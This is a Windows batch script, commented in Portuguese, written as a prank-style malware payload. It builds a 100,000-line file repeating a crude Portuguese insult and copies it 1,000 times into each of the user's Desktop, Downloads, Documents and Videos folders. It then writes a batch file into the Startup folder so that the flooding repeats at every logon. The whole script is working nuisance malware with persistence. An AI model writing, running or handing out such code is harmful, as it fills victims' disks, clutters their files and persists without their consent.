@echo off

REM ===== CAMINHOS =====
set DESKTOP=%USERPROFILE%\Desktop
set DOWNLOADS=%USERPROFILE%\Downloads
set DOCUMENTS=%USERPROFILE%\Documents
set VIDEOS=%USERPROFILE%\Videos
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set MODEL=%TEMP%\Lxzinn_modelo.txt

REM ===== CRIAR MODELO COM 1000 LINHAS =====
> "%MODEL%" (
    for /L %%i in (1,1,100000) do echo LUIZ COMEU SUA BUNDA OTARIO AHHAHAH
)

REM ===== CRIAR 1000 TXT EM CADA PASTA (RÁPIDO) =====
for /L %%i in (1,1,1000) do (
    copy /Y "%MODEL%" "%DESKTOP%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%DOWNLOADS%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
    copy /Y "%MODEL%" "%VIDEOS%\Lxzinn__%%i.txt" >nul
)

REM ===== CRIAR BAT DO STARTUP (BLINDADO) =====
> "%STARTUP%\startup_lxzinn.bat" (
    echo @echo off
    echo set MODEL=%%TEMP%%\Lxzinn_modelo.txt
    echo ^> "%%MODEL%%" ^(
    echo     for /L %%%%i in ^(1,1,100000^) do echo LUIZ COMEU SUA BUNDA OTARIO AHHAHAH
    echo ^)
    echo for /L %%%%i in ^(1,1,1000^) do ^(
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Desktop\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Downloads\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Documents\Lxzinn__%%%%i.txt" ^>nul
    echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Videos\Lxzinn__%%%%i.txt" ^>nul
    echo ^)
)


